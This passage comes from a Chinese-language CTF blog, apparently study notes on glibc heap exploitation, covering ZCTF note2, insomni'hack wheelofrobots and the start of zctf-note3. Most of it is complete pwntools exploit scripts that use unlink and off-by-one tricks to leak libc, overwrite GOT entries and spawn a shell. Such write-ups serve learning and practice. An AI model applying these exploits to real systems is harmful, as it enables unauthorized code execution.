class="string">'puts'</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">    ptr = <span class="number">0x0000000000602140</span>+<span class="number">0x10</span></span><br><span class="line">    <span class="comment">#for buffer</span></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x100</span>) <span class="comment">#idx1   </span></span><br><span class="line">    alloc(<span class="number">0x30</span>) <span class="comment">#idx2</span></span><br><span class="line">    alloc(<span class="number">0x80</span>) <span class="comment">#idx3</span></span><br><span class="line">    alloc(<span class="number">0x30</span>) <span class="comment">#idx4</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    fill(<span class="number">2</span>, payload)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">    payload += p64(free_got)+p64(puts_got) + <span class="string">'a'</span>*<span class="number">8</span> + p64(atoi_got)</span><br><span class="line">    fill(<span class="number">2</span>, payload) </span><br><span class="line">    fill(<span class="number">1</span>,p64(puts_plt))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">    puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    io.success(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br><span class="line">    </span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    fill(<span class="number">4</span>, p64(system_addr))</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h2><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L2dsaWJjLWhlYXAvdW5saW5rLXpoLw==" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/">ctf-wiki讲解<i class="fa fa-external-link"></i></span></p><p>我只讲差异，里面有的我就不讲了，我只发现了这个漏洞点<br>程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL。<br>然后我并不会利用这个，本来想利用chunk extends上一节学的，发觉他free后的大小不怎么对，到时看下源码吧，他free后的chunk大小不是合并后的大小，最后看到了大佬讲解的那个0，然后通过-1转成无符号整数，这个我自己查看的时候看不出</p><h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>第一步构造unlink，原理上一节弄过了，所以感觉这次顺畅好多</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr = <span class="number">0x0000000000602120</span> </span><br><span class="line">first()</span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa0</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) </span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'a'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, payload)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>unlink过后修改ptr[0]指针，指向atoi的got表，泄露地址，为什么指向atoi?为后面做准备</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, payload) </span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">"TheNewContents:Edit note success!\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Content is "</span>)</span><br><span class="line">atoi_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"atoi_addr: 0x%x"</span> % atoi_addr)</span><br><span class="line">libc_base = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br></pre></td></tr></table></figure><p>getshell,因为此时第一块堆块还指向atoi的got表，所以此时编辑下，就可以覆写got表了，输入的时候会将输入串atoi，所以就成为参数了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#get_shell</span></span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, p64(system_addr))</span><br><span class="line">io.sendline(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'note2'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'note2'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span><span class="params">(idx, choice, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shownote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Input your name:\n"</span>, <span class="string">"NoOne-hub"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input your address:\n"</span>, <span class="string">"NoOne-hub"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    ptr = <span class="number">0x0000000000602120</span> </span><br><span class="line">    first()</span><br><span class="line">    <span class="comment"># unlink</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa0</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) </span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'a'</span>)</span><br><span class="line">    newnote(<span class="number">0x80</span>, payload)</span><br><span class="line">    newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>)</span><br><span class="line">    newnote(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line">    editnote(<span class="number">0</span>, <span class="number">1</span>, payload) </span><br><span class="line">    shownote(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"TheNewContents:Edit note success!\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Content is "</span>)</span><br><span class="line">    atoi_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"atoi_addr: 0x%x"</span> % atoi_addr)</span><br><span class="line">    libc_base = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#get_shell</span></span><br><span class="line">    editnote(<span class="number">0</span>, <span class="number">1</span>, p64(system_addr))</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2017-insomni’hack-wheelofrobots"><a href="#2017-insomni’hack-wheelofrobots" class="headerlink" title="2017 insomni’hack wheelofrobots"></a>2017 insomni’hack wheelofrobots</h2><p>这道题难点我觉得在于代码长了点，然后漏洞点难找了点，其余还好，我自己分析的时候又是一头雾水，只看出free的时候没置空，然后还有的是在change部分，他代销有的居然达到了0x9C40uLL，这里我觉得也是一个点，off-by-one真没看出来</p><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L2dsaWJjLWhlYXAvdW5saW5rLXpoLw==" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/">ctf-wiki讲解<i class="fa fa-external-link"></i></span></p><p>我不在分析功能以及漏洞点分析，这次我自己没分析出来，只讲下漏洞利用过程以及过程中踩到的坑</p><h3 id="漏洞利用过程-2"><a href="#漏洞利用过程-2" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol><li>准备部分</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size=<span class="number">0</span>)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Bender's intelligence: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Robot Devil's cruelty: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Destructor's powerful: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    io.sendafter(<span class="string">"Robot's name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">off_by_one</span><span class="params">(byte)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"9999"</span> + byte)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr1, addr2)</span>:</span></span><br><span class="line">    change(<span class="number">1</span>, p64(addr1))</span><br><span class="line">    change(<span class="number">6</span>, p64(addr2))</span><br></pre></td></tr></table></figure><p><strong>注意：这里change是sendafter不是sendline，因为sendline会发送多一个\n破坏地址</strong></p><ol start="2"><li>off-by-one溢出修改部分</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">off_by_one(<span class="string">'\x01'</span>)</span><br><span class="line"><span class="comment"># change fd pointer</span></span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x0000000000603138</span>))</span><br><span class="line">off_by_one(<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pass the fastbin check size=0x20</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#now idx2-&gt;0x603138-&gt;null</span></span><br><span class="line"><span class="comment">#get malloc to -&gt; 0x603138</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">#now 0x603138-&gt;null</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#whell &lt;=2</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>我觉得这部分应该是顺风顺水的吧，off-by-one学过了</p><ol start="3"><li>关键点</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#now only have idx1 pointer-&gt;0x603138 , it's destructor_size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#the size must bigger than remove(2) remove(3)'s  size</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">4</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line"><span class="comment">#change idx6 size:1000</span></span><br><span class="line">change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line">ptr = <span class="number">0x00000000006030E8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x50</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x50</span>) <span class="comment">#pre_size</span></span><br><span class="line">payload += p64(<span class="number">0xa0</span>) <span class="comment">#size</span></span><br><span class="line">change(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>这里的话，要注意的就是开头申请的两个add了，那个不能低于remove的大小，不然会重新覆盖到那上边去，至于大小是多少，自己构造就好，然后溢出覆盖unlink，常见了</p><ol start="4"><li>修改并泄露地址</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr)</span><br><span class="line">change(<span class="number">6</span>, payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">write(elf.got[<span class="string">'exit'</span>], <span class="number">0x0000000000401855</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change robot_wheel to 3</span></span><br><span class="line">write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">change(<span class="number">1</span>, p64(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line">start_robot()</span><br><span class="line"><span class="comment"># leak </span></span><br><span class="line">io.recvuntil(<span class="string">" Thx "</span>)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure><p>我觉得这部分跟unlink属于同一部分的，重新修改地址，这里是将tinny改成指向destructor的位置处，这样编辑1就可以编辑第6处指针，在编辑第六处就是写入了，相当于任意写<br>写入完后泄露</p><ol start="5"><li>getshell了</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#get shell</span></span><br><span class="line">write(elf.got[<span class="string">'atoi'</span>], system_addr)</span><br><span class="line">io.send(<span class="string">"sh;#"</span>)</span><br></pre></td></tr></table></figure><p>跟前面套路一样，改掉atoi，然后传入sh就完了，ctf-wiki的改的free</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'wheelofrobots'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'wheelofrobots'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size=<span class="number">0</span>)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Bender's intelligence: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Robot Devil's cruelty: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Destructor's powerful: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    io.sendafter(<span class="string">"Robot's name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">off_by_one</span><span class="params">(byte)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"9999"</span> + byte)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr1, addr2)</span>:</span></span><br><span class="line">    change(<span class="number">1</span>, p64(addr1))</span><br><span class="line">    change(<span class="number">6</span>, p64(addr2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    off_by_one(<span class="string">'\x01'</span>)</span><br><span class="line">    <span class="comment"># change fd pointer</span></span><br><span class="line">    change(<span class="number">2</span>, p64(<span class="number">0x0000000000603138</span>))</span><br><span class="line">    off_by_one(<span class="string">'\x00'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#pass the fastbin check size=0x20</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line">    <span class="comment">#now idx2-&gt;0x603138-&gt;null</span></span><br><span class="line">    <span class="comment">#get malloc to -&gt; 0x603138</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#now 0x603138-&gt;null</span></span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#whell &lt;=2</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#now only have idx1 pointer-&gt;0x603138 , it's destructor_size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#the size must bigger than remove(2) remove(3)'s  size</span></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">4</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line">    <span class="comment">#change idx6 size:1000</span></span><br><span class="line">    change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line">    ptr = <span class="number">0x00000000006030E8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x50</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x50</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x50</span>) <span class="comment">#pre_size</span></span><br><span class="line">    payload += p64(<span class="number">0xa0</span>) <span class="comment">#size</span></span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># unlink</span></span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr)</span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    </span><br><span class="line">    write(elf.got[<span class="string">'exit'</span>], <span class="number">0x0000000000401855</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># change robot_wheel to 3</span></span><br><span class="line">    write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">    change(<span class="number">1</span>, p64(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line">    start_robot()</span><br><span class="line">    <span class="comment"># leak </span></span><br><span class="line">    io.recvuntil(<span class="string">" Thx "</span>)</span><br><span class="line">    puts_addr = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    write(elf.got[<span class="string">'atoi'</span>], system_addr)</span><br><span class="line">    io.send(<span class="string">"sh;#"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="zctf-note3"><a href="#zctf-note3" class="headerlink" title="zctf-note3"></a>zctf-note3</h2><p>这道题算自己做的了，自己分析漏洞点，自己做，不过有两个位置卡住了，暂时未得以解决先记录下来，从他人wp里获得的解决方案</p><h3 id="功能分析-1"><a href="#功能分析-1" class="headerlink" title="功能分析"></a>功能分析</h3><p>有增删查改，<br>查询部分是没用的，无法泄露</p><h3 id="漏洞点分析-1"><a href="#漏洞点分析-1" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>不知道为什么，看到这个读取函数瞬间就懂怎么做了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_4008DD</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v7; <span class="comment">// 